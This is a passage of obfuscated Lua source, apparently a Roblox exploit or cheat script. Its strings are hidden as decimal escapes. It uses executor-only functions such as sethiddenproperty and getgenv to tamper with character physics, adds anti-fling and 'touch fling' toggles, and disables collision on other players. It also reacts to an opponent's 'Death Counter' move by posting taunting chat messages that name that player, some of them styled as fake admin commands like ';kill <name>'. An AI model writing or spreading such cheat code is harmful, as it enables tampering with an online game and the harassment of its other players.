 end
 end
 _IllIlllIll() _IllllIlIlI = false _IIIllIIlll = false _lllIIlIIll = nil _IIIIllIIlI() if _IlIlIIlllI then _IlIlIIlllI:Disconnect() _IlIlIIlllI = nil end
 _lIIIllIIll:Disconnect() end
 ) end
 local function _lIlIlllIII() if not _llllIlllll then return end
 _llllIlllll = false if _IlIlIIlllI then _IlIlIIlllI:Disconnect() _IlIlIIlllI = nil end
 pcall( function () for _lIIlIllIlI, _lIIlIIlllI in pairs(_IlIlIlIIll) do if _lIIlIIlllI and _lIIlIIlllI.Character then local _IIIlIIIIIl = _lIIlIIlllI.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIIIl then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IIIlIIIIIl.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IIIlIIIIIl.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IIIlIIIIIl.Velocity = Vector3.zero end
 ) pcall( function () _IIIlIIIIIl.RotVelocity = Vector3.zero end
 ) end
 end
 end
 end
 ) _IIIIllIIlI() end
 _llIlIIlIll.CharacterAdded:Connect( function () if _lIIIllIlIl and _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] and _IlIllIIlIl() > 0x0 then task.wait(1.5) if _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] and not _llllIlllll then _IIlIlllllI() end
 end
 end
 ) local function _IIlIIlIIlI() end
 do local _lIIllIlIll = false local _llIIIlIIlI = nil local function _llIllllIlI(box) box:AddToggle("\065\110\116\105\070\108\105\110\103\084\111\103\103\108\101", { Text = "\065\110\116\105\045\070\108\105\110\103", Default = false, Callback = function (Value) if Value then if _lIIllIlIll then return end
 _lIIllIlIll = true _llIIIlIIlI = RunService.Stepped:Connect( function () for _lIIlIllIlI, _IlIlIIIlII in pairs(Players:GetPlayers()) do if _IlIlIIIlII ~= _llIlIIlIll and _IlIlIIIlII.Character then for _lIIlIllIlI, _lIllllllII in pairs(_IlIlIIIlII.Character:GetDescendants()) do if _lIllllllII:IsA("\066\097\115\101\080\097\114\116") then _lIllllllII.CanCollide = false end
 end
 end
 end
 end
 ) else _lIIllIlIll = false if _llIIIlIIlI then _llIIIlIIlI:Disconnect() _llIIIlIIlI = nil end
 end
 end
 }) table.insert(_IllIllIIll, function () _lIIllIlIll = false if _llIIIlIIlI then _llIIIlIIlI:Disconnect() _llIIIlIIlI = nil end
 pcall( function () _llIIllIlll.AntiFlingToggle:SetValue(false) end
 ) end
 ) end
 getgenv()._revenantAntiFlingBuild = _llIllllIlI end
 if _lIIIIIIllI[_llIIlIIIlI] then local _IIIIlIlIII = false local _Illlllllll = {} local _lIlIIlllll = {} local _IllllIIIIl = {} local _llIIlllIlI = setmetatable({}, { __mode = "\107" }) local _lllIIllllI = function () end
 local function _lIIlIlIIlI(_IIIlIIIlII) return _IIIlIIIlII:IsA("\065\099\099\101\115\115\111\114\121") and _IIIlIIIlII.Name == "\067\111\117\110\116\101\114" end
 local _llIllIIIII = {} local _lIlllIIllI = {} local function _IllIIIllIl(_IlIlIIIlII) _lIlIIlllll[_IlIlIIIlII] = nil _llIllIIIII[_IlIlIIIlII] = nil end
 local _lIlIlIIIIl = game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101") local _IIlllIIlll = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") local function _lIIlIIIlII(_IIllIIlllI, _IlIlIIIlII, counterChild) if _lIlIIlllll[_IlIlIIIlII] then return end
 _lIlIIlllll[_IlIlIIIlII] = true local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lIlIllIlIl then return end
 task.spawn( function () local _IllllIIIlI = Instance.new("\083\111\117\110\100") _IllllIIIlI.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\054\052\055\054\055\057\049\050\048\053" _IllllIIIlI.Volume = 0xA _IllllIIIlI.Parent = _lIlIllIlIl _IllllIIIlI:Play() local _llllllllII, template = pcall( function () return _IIlllIIlll:WaitForChild("\082\101\115\111\117\114\099\101\115", 0x5) :WaitForChild("\076\101\103\097\099\121\082\101\112\108\105\099\097\116\105\111\110", 0x5) :WaitForChild("\077\101\110\097\099\105\110\103", 0x5) end
 ) if not _llllllllII or not template then return end
 local _llIlIIIIll = {} for menacingIdx = 0x1, 0xA do local _llllIlIlII = Random.new():NextNumber(0.9, 1.1) local _llIIIlIIll = template:Clone() _llIIIlIIll.Enabled = true _llIIIlIIll.Size = UDim2.new(_llllIlIlII, 0x0, _llllIlIlII, 0x0) local _IIIIIIIIII = Random.new():NextNumber(-0x4, 0x4) local _lllllIIIII = math.random(-0x4, 0x4) _llIIIlIIll.StudsOffsetWorldSpace = Vector3.new(_IIIIIIIIII, 0x0, _lllllIIIII) _llIIIlIIll.Parent = _lIlIllIlIl table.insert(_llIlIIIIll, _llIIIlIIll) task.delay(menacingIdx, function () if _llIIIlIIll.Parent then local _IIIllIIIIl = table.find(_llIlIIIIll, _llIIIlIIll) if _IIIllIIIIl then table.remove(_llIlIIIIll, _IIIllIIIIl) end
 _lIlIlIIIIl:Create(_llIIIlIIll, TweenInfo.new(0x1, Enum.EasingStyle.Back, Enum.EasingDirection.In), { StudsOffsetWorldSpace = _llIIIlIIll.StudsOffsetWorldSpace - Vector3.new(0x0, 0xA, 0x0) } ):Play() _lIlIlIIIIl:Create(_llIIIlIIll.ImageLabel, TweenInfo.new(0x1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0x1 } ):Play() end
 end
 ) end
 local _IIllIIIlll = {} while task.wait() do for _lIIlIllIlI, menacingBillboard in pairs(_llIlIIIIll) do if not _IIllIIIlll[menacingBillboard] then _IIllIIIlll[menacingBillboard] = menacingBillboard.StudsOffsetWorldSpace end
 local _IllIlllllI = Random.new():NextNumber(-0.04, 0.04) menacingBillboard.StudsOffsetWorldSpace = _IIllIIIlll[menacingBillboard] + Vector3.new(_IllIlllllI, _IllIlllllI, _IllIlllllI) end
 if not (counterChild and counterChild.Parent) then local _IlIIlllIlI = _llIlIIIIll for _lIIlIllIlI, snapshotBillboard in pairs(_IlIIlllIlI) do local _llIIIlIlIl = Random.new():NextNumber(0x2, 0x3) _lIlIlIIIIl:Create(snapshotBillboard, TweenInfo.new(_llIIIlIlIl, Enum.EasingStyle.Back, Enum.EasingDirection.In), { StudsOffsetWorldSpace = (_IIllIIIlll[snapshotBillboard] or snapshotBillboard.StudsOffsetWorldSpace) - Vector3.new(0x0, 0xA, 0x0) } ):Play() _lIlIlIIIIl:Create(snapshotBillboard.ImageLabel, TweenInfo.new(_llIIIlIlIl, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0x1 } ):Play() end
 task.delay(0x3, function () for _lIIlIllIlI, oldBillboard in pairs(_IlIIlllIlI) do pcall( function () oldBillboard:Destroy() end
 ) end
 end
 ) break end
 end
 end
 ) end
 local function _lllllIlIll(_IIllIIlllI, _IlIlIIIlII) if not _IIllIIlllI or not _IlIlIIIlII or _IlIlIIIlII == _llIlIIlIll then return end
 if _lIlllIIllI[_IIllIIlllI] then return end
 _lIlllIIllI[_IIllIIlllI] = true for _lIIlIllIlI, _IIIlIIIlII in pairs(_IIllIIlllI:GetChildren()) do if _lIIlIlIIlI(_IIIlIIIlII) then if _IIIIlIlIII and not _llIllIIIII[_IlIlIIIlII] then MoveNotify(_IlIlIIIlII, "\068\101\097\116\104\032\067\111\117\110\116\101\114") _llIllIIIII[_IlIlIIIlII] = true _lIIlIIIlII(_IIllIIlllI, _IlIlIIIlII, _IIIlIIIlII) end
 _IIIlIIIlII.AncestryChanged:Connect( function () if not _IIIlIIIlII.Parent then _IllIIIllIl(_IlIlIIIlII) end
 end
 ) end
 end
 local _IllIIlIllI = _IIllIIlllI.ChildAdded:Connect( function (_IIIlIIIlII) if not _IIIIlIlIII then return end
 if not _lIIlIlIIlI(_IIIlIIIlII) then return end
 MoveNotify(_IlIlIIIlII, "\068\101\097\116\104\032\067\111\117\110\116\101\114") if _llIllIIIII[_IlIlIIIlII] then return end
 _llIllIIIII[_IlIlIIIlII] = true task.defer( function () _lIIlIIIlII(_IIllIIlllI, _IlIlIIIlII, _IIIlIIIlII) end
 ) _IIIlIIIlII.AncestryChanged:Connect( function () if not _IIIlIIIlII.Parent then _IllIIIllIl(_IlIlIIIlII) end
 end
 ) end
 ) table.insert(_Illlllllll, _IllIIlIllI) end
 local function _IllIlIllIl(_IlIlIIIlII) if _IlIlIIIlII == _llIlIIlIll then return end
 if _IlIlIIIlII.Character then task.spawn(_lllllIlIll, _IlIlIIIlII.Character, _IlIlIIIlII) end
 local _IllIIlIllI = _IlIlIIIlII.CharacterAdded:Connect( function (_IIllIIlllI) if not _IIIIlIlIII then return end
 _IllIIIllIl(_IlIlIIIlII) task.wait(0.1) _lllllIlIll(_IIllIIlllI, _IlIlIIIlII) end
 ) table.insert(_Illlllllll, _IllIIlIllI) end
 local _IllllIIlIl = _lIlIIlIIII table.insert(_IllIllIIll, function () _IIIIlIlIII = false for _lIIlIllIlI, _IlIlIllIll in pairs(_Illlllllll) do pcall(_IlIlIllIll.Disconnect, _IlIlIllIll) end
 _Illlllllll = {} _lIlIIlllll = {} _llIllIIIII = {} _lIlllIIllI = {} pcall( function () _llIIllIlll.ShowDeathCounter:SetValue(false) end
 ) end
 ) local _lIIlllIIIl = nil local _llllllIlII = nil local function _IlIIlllIII() return _lIIlIllIlI.AntiMoves_Saitama and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114") end
 local function _IllIlIllll() local _lIIIllIlll = _lIIlIllIlI.AntiDCWaitBeforeKillDD and _lIIlIllIlI.AntiDCWaitBeforeKillDD.Value if _lIIIllIlll == "\051\115\032\045\032\070\097\107\101\111\117\116" then return 0x3 end
 if _lIIIllIlll == "\053\115\032\045\032\076\111\110\103\032\070\097\107\101\111\117\116" then return 0x5 end
 return 0x0 end
 local function _IllIIlIlIl(_llIIIIIlll) local _IllIllIIIl = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101") local _lllllIIIll = _IllIllIIIl.TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _lllllIIIll then _lllllIIIll:SendAsync(_llIIIIIlll) end
 end
 local _lllllIlIII = { "\065\104\032\121\101\115\046\046\046\077\121\032\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\116\101\099\104\110\105\113\117\101\046\032\079\110\101\032\105\032\104\097\118\101\110\039\116\032\117\115\101\100\032\115\105\110\099\101\032\116\104\101\032\072\101\105\097\110\032\101\114\097\046", "\089\111\117\032\100\097\114\101\032\116\114\121\032\097\110\100\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\109\101\063\032\073\039\108\108\032\097\108\108\111\119\032\105\116\032\111\110\099\101\046\032\084\104\101\114\101\032\119\111\110\039\116\032\098\101\032\097\032\115\101\099\111\110\100\032\116\105\109\101\046", "\075\110\111\119\032\121\111\117\114\032\112\108\097\099\101\044\032\102\111\111\108\046", "\076\101\116\039\115\032\104\097\118\101\032\097\032\099\111\110\116\101\115\116\032\111\102\032\102\105\114\101\112\111\119\101\114\046\032\065\114\109\032\121\111\117\114\115\101\108\102\046", "\073\032\102\111\117\103\104\116\032\115\119\101\097\116\115\032\097\110\100\032\110\111\111\098\115\032\097\032\116\104\111\117\115\097\110\100\032\121\101\097\114\115\032\097\103\111\044\032\121\111\117\114\032\115\116\105\108\108\032\111\110\101\032\111\102\032\116\104\101\032\098\101\116\116\101\114\032\111\110\101\115\046\032\083\116\097\110\100\032\080\114\111\117\100\044\032\089\111\117\032\097\114\101\032\115\116\114\111\110\103\046", "\083\116\097\110\100\032\080\114\111\117\100\044\032\089\111\117\032\097\114\101\032\115\116\114\111\110\103\046", "\073\102\032\105\032\119\097\115\110\039\116\032\097\032\115\099\114\105\112\116\101\114\044\032\116\104\097\116\032\119\111\117\108\100\032\104\097\118\101\032\101\108\105\109\105\110\097\116\101\100\032\109\101\032\111\110\032\116\104\101\032\102\105\114\115\116\032\098\108\111\119\046", "\089\111\117\039\118\101\032\100\111\110\101\032\105\116\032\110\111\119\044\032\098\114\097\116\033", "\073\032\107\110\101\119\032\105\116\046\032\089\111\117\039\114\101\032\115\105\109\105\108\097\114\032\116\111\032\097\108\108\032\116\104\111\115\101\032\098\114\097\116\115\032\119\104\111\032\116\114\105\101\100\032\116\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\109\101\046", "\089\111\117\032\102\111\108\108\111\119\032\109\121\032\109\111\118\101\109\101\110\116\044\032\097\110\100\032\097\116\116\097\099\107\032\119\105\116\104\032\100\101\097\116\104\032\099\111\117\110\116\101\114\046\032\073\116\032\115\116\097\114\116\101\100\032\104\097\112\112\101\110\105\110\103\032\097\102\116\101\114\032\121\111\117\114\032\117\108\116\105\109\097\116\101\032\097\099\116\105\118\097\116\101\100\046", "\084\104\101\032\097\099\116\105\118\097\116\105\111\110\032\111\102\032\116\104\101\032\115\116\114\111\110\103\101\115\116\039\032\117\108\116\105\109\097\116\101\032\097\110\100\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\098\111\116\104\032\114\101\112\114\101\115\101\110\116\032\112\101\114\102\101\099\116\032\099\121\099\108\101\115\032\111\102\032\099\104\097\111\115\032\097\110\100\032\112\101\097\099\101\046", "\089\111\117\114\032\097\098\105\108\105\116\121\032\097\115\032\105\039\118\101\032\115\101\101\110\046\046\046\046\073\115\032\116\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\097\110\121\116\104\105\110\103\032\097\110\100\032\101\118\101\114\121\116\104\105\110\103\046\032\073\116\039\115\032\116\104\101\032\117\108\116\105\109\097\116\101\032\099\111\117\110\116\101\114\033", "\089\111\117\032\109\105\103\104\116\032\104\097\118\101\032\100\101\102\101\097\116\101\100\032\109\101\032\105\102\032\105\032\119\097\115\110\039\116\032\097\032\115\099\114\105\112\116\101\114\032\098\097\099\107\032\116\104\101\110\046", "\068\111\109\097\105\110\032\069\120\112\097\110\115\105\111\110\058\032\083\104\097\100\111\119\032\082\101\097\108\109", "\070\117\103\097\032\040\079\112\101\110\041", } local _lllIIIIlIl = { "\073\032\097\108\111\110\101\044\032\097\109\032\084\104\101\032\072\111\110\111\117\114\101\100\032\079\110\101\046", "\084\104\101\032\119\111\114\108\100\032\106\117\115\116\032\102\101\101\108\115\032\115\111\032\119\111\110\100\101\114\102\117\108\032\114\105\103\104\116\032\110\111\119\046\046", "\078\097\104\044\032\073\039\100\032\087\105\110\046", "\073\102\032\105\032\119\111\117\108\100\032\103\101\116\032\104\105\116\032\098\121\032\100\101\097\116\104\032\099\111\117\110\116\101\114\044\032\105\116\032\119\111\117\108\100\032\099\097\117\115\101\032\109\101\032\097\032\108\105\116\116\108\101\032\116\114\111\117\098\108\101\044\032\098\117\116\032\105\032\119\111\117\108\100\032\119\105\110\046", "\068\111\109\097\105\110\032\069\120\112\097\110\115\105\111\110\058\032\073\110\102\105\110\105\116\101\032\086\111\105\100", "\092\117\123\053\102\048\102\125\058\032\092\117\123\051\048\097\050\125\092\117\123\051\048\102\051\125\092\117\123\051\048\099\049\125\092\117\123\051\048\099\055\125\092\117\123\051\048\098\057\125\092\117\123\051\048\097\098\125\092\117\123\051\048\097\054\125\092\117\123\051\048\102\051\125\092\117\123\051\048\098\102\125\092\117\123\051\048\102\099\125\032\040\073\109\097\103\105\110\097\114\121\032\084\101\099\104\110\105\113\117\101\058\032\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\041", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\116\114\105\101\100\032\116\111\032\115\112\108\105\116\032\109\101\032\105\110\032\104\097\108\102\044\032\098\117\116\032\071\111\106\111\032\097\108\119\097\121\115\032\119\105\110\115\046", "\089\079\085\032\076\079\079\075\032\085\071\076\073\069\082\032\084\072\065\078\032\069\086\069\082\044\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\033\033", } local _lIlIlllIIl = { { Quote = "\073\116\032\116\111\111\107\032\109\101\032\097\032\119\104\105\108\101\046\046", WaitTime = 0x2 }, { Quote = "\066\117\116\032\073\032\102\105\110\097\108\108\121\032\103\114\097\115\112\101\100\032\105\116\032\111\110\032\116\104\101\032\118\101\114\103\101\032\111\102\032\100\101\097\116\104\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\046\046", WaitTime = 0x2 }, { Quote = "\084\104\101\032\116\114\117\101\032\101\115\115\101\110\099\101\032\111\102\032\099\117\114\115\101\100\032\101\110\101\114\103\121\046\046", WaitTime = 0x2 }, { Quote = "\082\069\086\069\082\083\069\032\067\085\082\083\069\068\032\084\069\067\072\078\073\081\085\069\033\033", WaitTime = 0x0 }, } local _IlllIIIlII = { "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\116\114\105\101\100\046", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\116\104\105\110\107\115\032\104\101\032\099\097\110\032\119\105\110\032\119\105\116\104\032\100\101\097\116\104\032\099\111\117\110\116\101\114\046", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\100\101\097\116\104\032\099\111\117\110\116\101\114\101\100\032\109\101\046\032\066\117\116\032\105\032\114\101\102\117\115\101\100\046", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\105\115\032\097\110\032\105\100\105\111\116\032\102\111\114\032\116\114\121\105\110\103\032\116\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\109\101\046", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\116\114\105\101\100\032\116\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\109\101\046", "\100\105\100\032\121\111\117\032\114\101\097\108\108\121\032\116\104\105\110\107\032\121\111\117\032\099\111\117\108\100\032\107\105\108\108\032\109\101\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\046\046\046\046\063", "\073\039\109\032\110\111\116\032\103\111\110\110\097\032\108\101\116\032\116\104\097\116\032\115\108\105\100\101\044\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\046", } local _llllIIIllI = { "\059\107\105\108\108\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", "\059\114\101\115\112\097\119\110\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", "\059\107\105\099\107\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", "\059\098\097\110\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", "\059\114\101\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", } local function _IIIIlllIII(attackerPlayer, _llIIIIllII) local _lIIIllIlll = _lIIlIllIlI.AntiDCQuotesDD and _lIIlIllIlI.AntiDCQuotesDD.Value or "\078\111\032\081\117\111\116\101\115" if _lIIIllIlll == "\078\111\032\081\117\111\116\101\115" then return end
 local _lIIIIllIIl = (_llIIIIllII and _llIIIIllII ~= "") and _llIIIIllII or "\091\112\108\097\099\101\104\111\108\100\101\114\093" if _lIIIllIlll == "\083\117\107\117\110\097\032\081\117\111\116\101\115" then _IllIIlIlIl(_lllllIlIII[math.random(#_lllllIlIII)]) elseif _lIIIllIlll == "\071\111\106\111\032\081\117\111\116\101\115" then if math.random(0x2) == 0x1 then _IllIIlIlIl(_lllIIIIlIl[math.random(#_lllIIIIlIl)] :gsub("\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _lIIIIllIIl) :gsub("\068\069\065\084\072\067\079\085\078\084\069\082\069\082\072\065\072\065", _lIIIIllIIl:upper())) else task.spawn( function () for _lIIlIllIlI, entry in ipairs(_lIlIlllIIl) do _IllIIlIlIl(entry.Quote:gsub("\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _lIIIIllIIl)) if entry.WaitTime > 0x0 then task.wait(entry.WaitTime) end
 end
 end
 ) end
 task.spawn( function () local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII then return end
 local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\055\050\055\053\055\057\056\052\052\050" local _IlIlIlIlIl = _lIlIIllIII:LoadAnimation(_IlIllllIlI) _IlIlIlIlIl:Play() _IlIlIlIlIl.TimePosition = 2.5 repeat task.wait() until _IlIlIlIlIl.TimePosition >= 0x3 local _lIlIIIIlll = 0x0 for _lIIlIllIlI = 0x1, 0x96 do _lIlIIIIlll = _lIlIIIIlll + 0.1 _lIlIIllIII.HipHeight = _lIlIIIIlll task.wait() end
 repeat task.wait() until _IlIlIlIlIl.TimePosition >= 6.5 _IlIlIlIlIl:AdjustSpeed(0.2) task.wait(0x7) _IlIlIlIlIl:Stop(0.6) _lIlIIllIII.HipHeight = 0x0 end
 ) elseif _lIIIllIlll == "\078\097\109\101\032\081\117\111\116\101\115" then _IllIIlIlIl(string.gsub(_IlllIIIlII[math.random(#_IlllIIIlII)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _lIIIIllIIl)) elseif _lIIIllIlll == "\065\100\109\105\110\032\081\117\111\116\101\115" then _IllIIlIlIl(string.gsub(_llllIIIllI[math.random(#_llllIIIllI)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _lIIIIllIIl)) elseif _lIIIllIlll == "\082\097\110\100\111\109" then local _IIIIlIlIIl = { "\083\117\107\117\110\097\032\081\117\111\116\101\115", "\071\111\106\111\032\081\117\111\116\101\115", "\078\097\109\101\032\081\117\111\116\101\115", "\065\100\109\105\110\032\081\117\111\116\101\115" } local _IIlIIIIllI = _IIIIlIlIIl[math.random(#_IIIIlIlIIl)] if _IIlIIIIllI == "\083\117\107\117\110\097\032\081\117\111\116\101\115" then _IllIIlIlIl(_lllllIlIII[math.random(#_lllllIlIII)]) elseif _IIlIIIIllI == "\071\111\106\111\032\081\117\111\116\101\115" then _IllIIlIlIl(string.gsub(_lllIIIIlIl[math.random(#_lllIIIIlIl)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _lIIIIllIIl)) elseif _IIlIIIIllI == "\078\097\109\101\032\081\117\111\116\101\115" then _IllIIlIlIl(string.gsub(_IlllIIIlII[math.random(#_IlllIIIlII)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _lIIIIllIIl)) elseif _IIlIIIIllI == "\065\100\109\105\110\032\081\117\111\116\101\115" then _IllIIlIlIl(string.gsub(_llllIIIllI[math.random(#_llllIIIllI)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _lIIIIllIIl)) end
 elseif _lIIIllIlll == "\083\097\110\115\032\081\117\111\116\101\115" then local _lIlIllIlII = { DeathCounterQuote1 = { "\10033\032\108\111\111\107\115\032\108\105\107\101\032\116\104\097\116\032\103\117\121\032\119\104\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\101\100\032\109\101\032\108\111\111\107\101\100\032\112\114\101\116\116\121\032\102\114\117\115\116\114\097\116\101\100\046", "\10033\032\105\032\109\117\115\116\110\039\116\032\103\111\115\115\105\112\044\032\105\032\119\111\117\108\100\032\098\101\032\097\110\103\114\121\032\116\111\111\046", "\10033\032\121\101\097\104\046\046\046\032\109\097\121\098\101\046" }, DeathCounterQuote2 = { "\10033\032\104\109\109\046\032\116\104\101\105\114\032\101\120\112\114\101\115\115\105\111\110\046\046\046", "\10033\032\116\104\097\116\032\119\097\115\032\116\104\101\032\101\120\112\114\101\115\115\105\111\110\032\111\102\032\115\111\109\101\111\110\101\032\119\104\111\039\115\032\114\097\103\101\100\032\116\119\105\099\101\032\105\110\032\097\032\114\111\119\046", "\10033\032\115\117\102\102\105\099\101\032\116\111\032\115\097\121\044\032\116\104\101\121\032\108\111\111\107\101\100\032\114\101\097\108\108\121\046\046\046\032\117\110\115\097\116\105\115\102\105\101\100\046", "\10033\032\097\108\108\032\114\105\103\104\116\046", "\10033\032\104\111\119\032\039\098\111\117\116\032\105\032\109\097\107\101\032\105\116\032\097\032\116\104\105\114\100\063" }, DeathCounterQuote3 = { "\10033\032\104\109\109\046\032\116\104\101\105\114\032\101\120\112\114\101\115\115\105\111\110\046\046\046", "\10033\032\116\104\097\116\032\119\097\115\032\116\104\101\032\101\120\112\114\101\115\115\105\111\110\032\111\102\032\115\111\109\101\111\110\101\032\119\104\111\039\115\032\100\105\101\100\032\116\104\114\105\099\101\032\105\110\032\097\032\114\111\119\046", "\10033\032\046\032\046\032\046", "\10033\032\103\117\101\115\115\032\121\111\117\032\099\111\117\108\100\032\115\097\121\046\046\046\032\105\032\116\117\114\110\101\100\032\116\104\097\116\032\115\109\105\108\101\032\117\112\115\105\100\101\032\100\111\119\110\046", "\10033\032\119\104\097\116\115\032\116\104\101\032\112\117\110\099\104\108\105\110\101\063", "\10033\032\105\032\100\111\110\039\116\032\107\110\111\119\046" }, DeathCounterQuote4 = { "\10033\032\104\109\109\046\032\116\104\101\105\114\032\101\120\112\114\101\115\115\105\111\110\046\046\046", "\10033\032\116\104\097\116\039\115\032\116\104\101\032\101\120\112\114\101\115\115\105\111\110\032\111\102\032\115\111\109\101\111\110\101\032\119\104\111\039\115\032\117\110\119\105\108\108\105\110\103\032\116\111\032\103\105\118\101\032\117\112\046", "\10033\032\046\032\046\032\046\105\032\099\097\110\039\116\032\099\111\117\110\116\032\097\102\116\101\114\032\052\046", "\10033\032\109\101\032\097\110\100\032\121\111\117\032\109\105\103\104\116\032\098\101\032\115\117\114\112\114\105\115\101\100\032\116\111\032\115\101\101\032\109\111\114\101\032\100\105\097\108\111\103\117\101\046", "\10033\032\100\111\110\039\116\032\119\111\114\114\121\046\032\105\109\032\115\117\114\101\032\105\116\032\101\110\100\115\032\115\111\109\101\119\104\101\114\101\046" }, DeathCounterQuote5 = { "\10033\032\104\109\109\046\032\116\104\101\105\114\032\101\120\112\114\101\115\115\105\111\110\046\046\046", "\10033\032\116\104\097\116\039\115\032\116\104\101\032\101\120\112\114\101\115\115\105\111\110\032\111\102\032\115\111\109\101\111\110\101\032\119\104\111\039\115\032\117\110\119\105\108\108\105\110\103\032\116\111\032\103\105\118\101\032\117\112\046", "\10033\032\100\105\100\032\105\032\103\101\116\032\121\111\117\063\032\100\105\100\032\121\111\117\032\116\104\105\110\107\032\116\104\097\116\032\116\104\101\032\100\105\097\108\111\103\117\101\032\119\097\115\032\103\111\110\110\097\032\114\101\112\101\097\116\063", "\10033\032\100\111\110\039\116\032\119\111\114\114\121\046\032\105\116\115\032\103\111\110\110\097\032\114\101\112\101\097\116\032\115\111\111\110\046", "\10033\032\111\118\101\114\032\097\110\100\032\111\118\101\114\044\032\117\110\116\105\108\032\101\118\101\114\121\116\104\105\110\103\032\105\115\032\114\101\115\101\116\046" }, DeathCounterQuote6 = { "\10033\032\111\117\114\032\114\101\112\111\114\116\115\032\115\104\111\119\101\100\032\097\032\109\097\115\115\105\118\101\032\115\119\101\097\116\032\105\110\032\116\104\101\032\114\111\098\108\111\120\032\099\111\110\116\105\110\117\117\109\046", "\10033\032\112\108\097\121\101\114\115\032\100\097\115\104\105\110\103\032\108\101\102\116\032\097\110\100\032\114\105\103\104\116\044\032\099\111\109\098\111\105\110\103\032\097\110\100\032\100\121\105\110\103\046\046\046", "\10033\032\117\110\116\105\108\032\115\117\100\100\101\110\108\121\044\032\101\118\101\114\121\116\104\105\110\103\032\101\110\100\115\046" }, DeathCounterQuote7 = { "\10033\032\104\101\104\032\104\101\104\032\104\101\104\046\046\046", "\10033\032\121\111\117\032\116\104\105\110\107\032\105\116\039\115\032\116\104\101\032\100\101\118\115\032\102\097\117\108\116\044\032\105\115\110\039\116\032\105\116\063", "\10033\032\121\111\117\032\099\097\110\039\116\032\117\110\100\101\114\115\116\097\110\100\032\104\111\119\032\116\104\105\115\032\102\101\101\108\115\046" }, DeathCounterQuote8 = { "\10033\032\107\110\111\119\105\110\103\032\116\104\097\116\032\111\110\101\032\100\097\121\044\032\119\105\116\104\111\117\116\032\097\110\121\032\119\097\114\110\105\110\103\046\046\046", "\10033\032\105\116\039\115\032\097\108\108\032\103\111\105\110\103\032\116\111\032\098\101\032\117\112\100\097\116\101\100\046", "\10033\032\108\111\111\107\046\032\105\032\103\097\118\101\032\117\112\032\116\114\121\105\110\103\032\116\111\032\103\111\032\098\097\099\107\032\116\111\032\114\097\110\107\032\049\032\097\032\108\111\110\103\032\116\105\109\101\032\097\103\111\046" }, DeathCounterQuote9 = { "\10033\032\103\101\116\116\105\110\103\032\116\111\032\116\104\101\032\108\101\097\100\101\114\098\111\097\114\100\032\100\111\101\115\110\039\116\032\114\101\097\108\108\121\032\097\112\112\101\097\108\032\097\110\121\109\111\114\101\044\032\101\105\116\104\101\114\046", "\10033\032\099\097\117\115\101\032\101\118\101\110\032\105\102\032\105\032\100\111\046\046\046", 